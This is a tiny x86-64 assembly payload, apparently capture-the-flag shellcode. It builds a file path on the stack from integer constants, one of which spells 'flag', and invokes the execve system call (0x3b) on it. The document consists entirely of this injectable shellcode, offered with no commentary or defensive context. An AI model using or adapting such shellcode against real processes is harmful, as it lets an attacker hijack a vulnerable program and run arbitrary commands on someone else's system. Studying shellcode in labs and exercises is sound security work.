BITS 64
global _start

_start:
	; mov rdi, 0
	push 0
	mov rdi, 1734437990
	push rdi
	mov rdi, 8387223334460940847
	push rdi
	mov rsi, 0
	mov rdx, 0
	mov rdi, rsp
	mov rax, 0x3b
	syscall